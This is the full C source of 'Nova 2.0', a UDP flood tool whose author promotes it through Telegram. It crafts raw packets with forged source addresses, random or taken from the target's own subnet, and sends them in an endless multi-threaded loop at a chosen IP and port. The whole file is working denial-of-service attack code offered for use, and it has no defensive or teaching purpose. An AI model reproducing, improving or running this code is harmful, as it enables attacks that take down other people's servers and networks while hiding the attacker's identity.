/*
    N O V A 2.0

    Method made by Alemalakra @2018.

    Azk methods are a bullshit, Mexican always beat French's.
*/

#include<stdio.h>
#include<string.h>
#include<sys/socket.h>
#include<stdlib.h>
#include<errno.h>
#include<netinet/udp.h>
#include<netinet/ip.h>
#include<arpa/inet.h>
#include<pthread.h>
#include<stdint.h>
#include<unistd.h>
#include<sys/types.h>
#include<stdbool.h>
#include<time.h>

struct thread_data{ int thread_id; struct list *list_node; struct sockaddr_in sin; };
char ipv4src[17];
char * payload_data;
int Checksum;
int Source_Local = 0;
static unsigned int floodport;
volatile unsigned int game = 1;
volatile int limiter;
volatile unsigned int packets_per_second;
volatile unsigned int sleeptime = 100;
 
/* 
    96 bit (12 bytes) pseudo header needed for udp header checksum calculation.
*/
struct pseudo_header
{
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t udp_length;
};

/* 
    Local-IPv4 Function Splitter.
*/
char *local_ipv4_target(char *baseip) {
    struct in_addr ipaddress, subnetmask;
    inet_pton(AF_INET, baseip, &ipaddress);
    inet_pton(AF_INET, "255.255.255.0", &subnetmask);
    unsigned long first_ip = ntohl(ipaddress.s_addr & subnetmask.s_addr);
    unsigned long last_ip = ntohl(ipaddress.s_addr | ~(subnetmask.s_addr));
    unsigned long ipfinal = htonl((rand() % (last_ip - first_ip + 1)) + first_ip);
    char *result = malloc(INET_ADDRSTRLEN);
    inet_ntop(AF_INET, &ipfinal, result, INET_ADDRSTRLEN);
    return result;
}
 
/*
    Generic checksum calculation function, (Unliky all public scripts, This sending valid packets serial, Of course with Opt in Argument.)
*/
unsigned short csum(unsigned short *ptr,int nbytes) 
{
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    
    if(nbytes==1) {
        oddbyte=0;
        *((u_char*)&oddbyte)=*(u_char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     

    return(answer);
}

/*
    String/Number replace for %r% and %n% new function on Nova 2.0.
*/

char *replace_nova(char *str, char *toReplace, int onlyNumbers) {
    char *result;
    int toReplaceLen = strlen(toReplace);
    int i, cnt = 0;
    for (i = 0; str[i] != '\0'; i++) {
        if (strstr(&str[i], toReplace) == &str[i]) {
            cnt++;
            i += toReplaceLen - 1;
        }
    }
    result = (char *)malloc(i + cnt * (1 - toReplaceLen) + 1); // 1 caracter aleatorio - toReplaceLen
    char randchar[2];
    randchar[1] = '\0';
    i = 0;
    while (*str) {
        if (strstr(str, toReplace) == str) {
            randchar[0] = (char)onlyNumbers ? (rand() % (48 - 57 + 1)) + 48 : (rand() % (122 - 97 + 1)) + 97;
            strcpy(&result[i], randchar);
            i += 1; // 1 caracter aleatorio
            str += toReplaceLen;
        } else {
            result[i++] = *str++;
        }
    }
    result[i] = '\0';
    return result;
}

/*
    IPv4 Generation Function (Made by me, took me some time, But yh).
*/
char * ipv4_generator(char *par1, char * targettr, int Source_Local) {
    if (Source_Local == 1) { // Yes Source Local Spoof.
        return local_ipv4_target(par1);
    } else { // Random IPv4
        snprintf(ipv4src, sizeof(ipv4src)-1, "%d.%d.%d.%d", rand()%254, rand()%254, rand()%254, rand()%254);
    }
    return ipv4src;
}

/*
    Nova flood thread. (Each thread)
*/
void *nova_thread(void *par1) {
    // Target.
    char *targettr = (char *)par1;
    //Create a raw socket of type IPPROTO. (IPv4 Of course...)
    int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s == -1) {
        //socket creation failed, may be because of non-root privileges.
        perror("Failed to create raw socket, Get root eh?");
        exit(1);
    }
    //Datagram to represent the packet
    char datagram[4096] , source_ip[32] , *data , *pseudogram;
    //zero out the packet buffer
    memset (datagram, 0, 4096);
    //IP header
    struct iphdr *iph = (struct iphdr *) datagram;
    //UDP header
    struct udphdr *udph = (struct udphdr *) (datagram + sizeof (struct ip));
    struct sockaddr_in sin;
    struct pseudo_header psh;
    //Data part
    data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
    strcpy(data , payload_data);

    // Source IPv4.
    strcpy(source_ip , "255.255.255.255");
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr (targettr);
    //Fill in the IP Header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + strlen(data);
    iph->id = htonl (54321); //Id of this packet
    iph->frag_off = 0;
    iph->ttl = rand()%255;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;      //Set to 0 before calculating checksum
    iph->saddr = inet_addr ( source_ip );    //Spoof the source ip address
    iph->daddr = sin.sin_addr.s_addr;
    // IPv4 Checksum-
    iph->check = csum ((unsigned short *) datagram, iph->tot_len);
    //UDP header
    udph->source = htons (rand()%10000);
    udph->dest = htons (floodport);
    udph->len = htons(8 + strlen(data));
    udph->check = 0; //leave checksum 0 now, filled later by pseudo header
    //Now the UDP checksum using the pseudo header.
    psh.source_address = inet_addr( source_ip );
    psh.dest_address = sin.sin_addr.s_addr;
    psh.placeholder = 0;
    psh.protocol = IPPROTO_UDP;
    psh.udp_length = htons(sizeof(struct udphdr) + strlen(data) );
    int psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
    pseudogram = malloc(psize);
    memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
    memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + strlen(data));
    udph->check = csum( (unsigned short*) pseudogram , psize);
    srand(time(NULL));
    while (1)
    {
        //Send the packet
        sendto (s, datagram, iph->tot_len ,  0, (struct sockaddr *) &sin, sizeof (sin));
        iph->ttl = rand()%255;
        // EMPEZAR TEST AQUI CTRL ZETA
        
        udph->source = htons (rand()%10000);
        udph->len = htons(8 + strlen(data));
        udph->check = 0;
        strcpy(source_ip , ipv4_generator((char *) par1, targettr, Source_Local));
        iph->saddr = inet_addr ( source_ip );
        psh.source_address = inet_addr( source_ip );
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_UDP;
        psh.udp_length = htons(sizeof(struct udphdr) + strlen(data) );
        
        if(strstr(payload_data, "%r%") != NULL || strstr(payload_data, "%n%") != NULL) {
            data = datagram + sizeof(struct iphdr) + sizeof(struct udphdr);
            strcpy(data , replace_nova(payload_data, "%r%", 0));
            strcpy(data , replace_nova(data, "%n%", 1));
            iph->tot_len = sizeof (struct iphdr) + sizeof (struct udphdr) + strlen(data);
            iph->check = csum ((unsigned short *) datagram, iph->tot_len);
            udph->len = htons(8 + strlen(data));

            if (Checksum == 0) {
                udph->check = 0;
            } else {
                psh.udp_length = htons(sizeof(struct udphdr) + strlen(data) );

                psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
                pseudogram = malloc(psize);
                memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + strlen(data));
                
                udph->check = csum( (unsigned short*) pseudogram , psize);
            }
        } else {
            if (Checksum == 0) {
                udph->check = 0;    
            } else {
                psize = sizeof(struct pseudo_header) + sizeof(struct udphdr) + strlen(data);
                pseudogram = malloc(psize);
                memcpy(pseudogram , (char*) &psh , sizeof (struct pseudo_header));
                memcpy(pseudogram + sizeof(struct pseudo_header) , udph , sizeof(struct udphdr) + strlen(data));
                udph->check = csum( (unsigned short*) pseudogram , psize);
            }
        }


    }
}
 
/*
    Main function. (Threads, Arguments, PPS Limiter, Custom Payload, Etc, Etc..)
*/
int main(int argc, char *argv[ ]){
    if(argc < 9){
            fprintf(stdout, "[!] Nova v2.0 by Alemalakra.\n");
            fprintf(stdout, "[!] Usage: %s <IP> <PORT> <PAYLOAD> <THREADS> <PPS> <TIME> <CHECKSUM> <SOURCE_LOCAL>\n", argv[0]);
            fprintf(stdout, "[!] Get details contacting me on Telegram.\n");
            exit(-1);
    }
    int i = 0;
    //game = atoi(argv[3]);
    int num_threads = atoi(argv[4]);
    int maxpps = atoi(argv[5]);
    payload_data = argv[3];
    floodport = atoi(argv[2]);
    Checksum = atoi(argv[7]);
    Source_Local = atoi(argv[8]);
    limiter = 0;    
    packets_per_second = 0;
    int multiplier = 20;
    pthread_t thread[num_threads];
    struct thread_data td[num_threads];

    for(i = 0;i<num_threads;i++){
        pthread_create( &thread[i], NULL, &nova_thread, (void *) argv[1]);
    }
    fprintf(stdout, "[!] Preparing payload.... DONE!\n");
    fprintf(stdout, "[!] Attack should be started now.\n");

    for(i = 0;i<(atoi(argv[6])*multiplier);i++) {
        usleep((1000/multiplier)*1000);
        if((packets_per_second*multiplier) > maxpps) {
            if(1 > limiter) {
                sleeptime+=100;
            } else {
                limiter--;
            }
        } else {
            limiter++;
            if(sleeptime > 25) {
                sleeptime-=25;
            } else {
                sleeptime = 0;
            }
        }
        packets_per_second = 0;
    }

    return 0;
}